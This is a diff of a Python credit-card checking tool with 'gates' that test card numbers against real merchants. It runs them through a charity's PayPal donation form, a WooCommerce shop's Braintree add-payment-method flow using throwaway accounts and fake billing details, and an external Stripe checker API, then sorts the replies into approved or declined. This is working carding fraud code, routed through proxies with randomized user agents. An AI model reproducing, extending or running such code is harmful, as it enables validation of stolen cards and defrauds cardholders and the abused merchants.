@@ -41,7 +41,13 @@ def generate_user_agent():
     return random.choice(ua_list)
 
 # ============================================================================
-# New working PayPal gate (uses 2africa.org)
+# Global constants (kept for compatibility with complete_handler.py)
+# ============================================================================
+PAYPAL_SITE = "http://bavashdesigns.com"
+PAYPAL_AMOUNT = 0.05
+
+# ============================================================================
+# Working PayPal gate (uses 2africa.org)
 # ============================================================================
 def check_paypal_working(cc, proxy=None):
     """
@@ -57,12 +63,10 @@ def check_paypal_working(cc, proxy=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # --- Fixed site data ---
         SITE_URL = 'https://2africa.org/donate-now/'
         BASE_URL = 'https://2africa.org'
         UA = generate_user_agent()
 
-        # --- Extract initial form data ---
         def extract_data():
             s = requests.Session()
             s.verify = False
@@ -109,7 +113,6 @@ def check_paypal_working(cc, proxy=None):
         first_name = 'DRGAM'
         last_name = 'rights and'
 
-        # --- Step 1: Initial donation setup (GET) ---
         headers = {
             'origin': BASE_URL, 'referer': SITE_URL,
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
@@ -135,7 +138,6 @@ def check_paypal_working(cc, proxy=None):
         }
         s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)
 
-        # --- Step 2: Create PayPal order (multipart) ---
         mp = MultipartEncoder(fields={
             'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
             'give-form-id': (None, fi), 'give-form-title': (None, ''),
@@ -158,7 +160,6 @@ def check_paypal_working(cc, proxy=None):
         except:
             return f"Order creation failed: {r1.text[:150]}", "ERROR"
 
-        # --- Step 3: Confirm payment source with PayPal ---
         pp_headers = {
             'authority': 'cors.api.paypal.com', 'accept': '*/*',
             'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
@@ -186,7 +187,6 @@ def check_paypal_working(cc, proxy=None):
         }
         s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data, timeout=30)
 
-        # --- Step 4: Approve order ---
         mp2 = MultipartEncoder(fields={
             'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
             'give-form-id': (None, fi), 'give-form-title': (None, ''),
@@ -206,7 +206,6 @@ def check_paypal_working(cc, proxy=None):
         r2 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order=' + tok, headers=headers, data=mp2, timeout=30)
         txt = r2.text
 
-        # --- Parse response ---
         decline_patterns = {
             'DO_NOT_HONOR': 'Do not honor',
             'ACCOUNT_CLOSED': 'Account closed',
@@ -246,21 +245,17 @@ def check_paypal_working(cc, proxy=None):
     except Exception as e:
         return f"Exception: {str(e)[:100]}", "ERROR"
 
-# Replace old PayPal functions with the working one
+# Alias to match existing function names
 check_paypal_fixed = check_paypal_working
 check_paypal_general = check_paypal_working
 
 # ============================================================================
-# Stripe API Gate (unchanged, uses external API)
+# Stripe API Gate
 # ============================================================================
 STRIPE_SITE = "newzealandtrends.com"
 STRIPE_API_URL = "https://stripe-checker-production-e6a0.up.railway.app/v1/stripe/auth"
 
 def check_stripe_api(cc, proxy=None):
-    """
-    Check a card using the external Stripe API.
-    Returns (message, status) where status is 'APPROVED' or 'DECLINED'.
-    """
     try:
         cc = cc.strip()
         parts = cc.split('|')
@@ -281,7 +276,6 @@ def check_stripe_api(cc, proxy=None):
         data = response.json()
 
         result = data.get('result', '').lower()
-
         if 'charged' in result or 'approved' in result or 'success' in result:
             return result, "APPROVED"
         else:
@@ -300,10 +294,6 @@ def check_stripe_api(cc, proxy=None):
 # Local Braintree gate (replaces the broken Onyx version)
 # ============================================================================
 def check_braintree(cc, proxy=None):
-    """
-    Local Braintree tokenization gate using shop.trifectanutrition.com
-    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
-    """
     try:
         cc = cc.strip()
         parts = cc.split('|')
@@ -313,7 +303,6 @@ def check_braintree(cc, proxy=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # Generate random email
         username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
         email = f"{username}@gmail.com"
         user_agent = generate_user_agent()
@@ -323,18 +312,15 @@ def check_braintree(cc, proxy=None):
             session.proxies.update(format_proxy(proxy))
         session.verify = False
 
-        # Step 1: Create user account
         headers = {'User-Agent': user_agent}
         json_data = {'email': email, 'password': email}
-        resp = session.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
-                            headers=headers, json=json_data, timeout=30)
+        session.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
+                     headers=headers, json=json_data, timeout=30)
 
-        # Step 2: Get address nonce
         resp = session.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                            headers=headers, timeout=30)
         address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', resp.text).group(1)
 
-        # Step 3: Set billing address
         data = {
             'billing_first_name': 'Hussein',
             'billing_last_name': 'Alfuraijii',
@@ -354,13 +340,11 @@ def check_braintree(cc, proxy=None):
         session.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                      headers=headers, data=data, timeout=30)
 
-        # Step 4: Get payment method page and nonces
         resp = session.get('https://shop.trifectanutrition.com/my-account/add-payment-method/',
                            headers=headers, timeout=30)
         payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text).group(1)
         client_token_nonce = re.search(r'client_token_nonce":"([^"]+)"', resp.text).group(1)
 
-        # Step 5: Get Braintree client token
         data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
         resp = session.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php',
                             headers=headers, data=data, timeout=30)
@@ -368,7 +352,6 @@ def check_braintree(cc, proxy=None):
         dec = base64.b64decode(enc).decode('utf-8')
         auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
 
-        # Step 6: Tokenize card with Braintree GraphQL
         braintree_headers = {
             'authority': 'payments.braintree-api.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -404,7 +387,6 @@ def check_braintree(cc, proxy=None):
                              headers=braintree_headers, json=json_data, timeout=30)
         token = resp.json()['data']['tokenizeCreditCard']['token']
 
-        # Step 7: Add payment method
         data = {
             'payment_method': 'braintree_credit_card',
             'wc-braintree-credit-card-card-type': 'master-card',
@@ -422,7 +404,6 @@ def check_braintree(cc, proxy=None):
                             headers=headers, data=data, timeout=30)
         text = resp.text
 
-        # Step 8: Parse result
         if 'added' in text or 'Payment method successfully added.' in text:
             return "Approved ✅", "APPROVED"
         elif 'Duplicate card exists' in text:
@@ -434,7 +415,6 @@ def check_braintree(cc, proxy=None):
         elif 'avs' in text or 'cvv' in text:
             return "AVS/CVV Failure", "DECLINED"
         else:
-            # Try to extract reason
             match = re.search(r'Reason: (.+?)\s*</li>', text)
             if match:
                 reason = match.group(1)
@@ -447,7 +427,6 @@ def check_braintree(cc, proxy=None):
 # ============================================================================
 # The following gates are disabled because the Onyx API is not working.
 # They are replaced with dummy functions that return an error.
-# If you later restore the Onyx API, you can uncomment the original code.
 # ============================================================================
 def _onyx_unavailable(gate_name):
     return lambda cc, proxy=None: (f"{gate_name} unavailable (Onyx API down)", "ERROR")
